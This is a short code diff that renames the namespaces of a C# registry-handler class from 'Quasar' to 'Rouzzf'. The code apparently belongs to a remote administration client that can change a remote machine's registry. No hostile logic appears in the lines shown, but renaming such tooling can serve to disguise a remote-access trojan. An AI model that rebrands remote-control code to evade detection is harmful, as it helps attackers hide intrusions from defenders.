@@ -1,12 +1,12 @@
-﻿using Quasar.Client.Extensions;
-using Quasar.Client.Helper;
-using Quasar.Client.Registry;
-using Quasar.Common.Messages;
-using Quasar.Common.Models;
-using Quasar.Common.Networking;
+﻿using Rouzzf.Client.Extensions;
+using Rouzzf.Client.Helper;
+using Rouzzf.Client.Registry;
+using Rouzzf.Common.Messages;
+using Rouzzf.Common.Models;
+using Rouzzf.Common.Networking;
 using System;
 
-namespace Quasar.Client.Messages
+namespace Rouzzf.Client.Messages
 {
     public class RegistryHandler : IMessageProcessor
     {
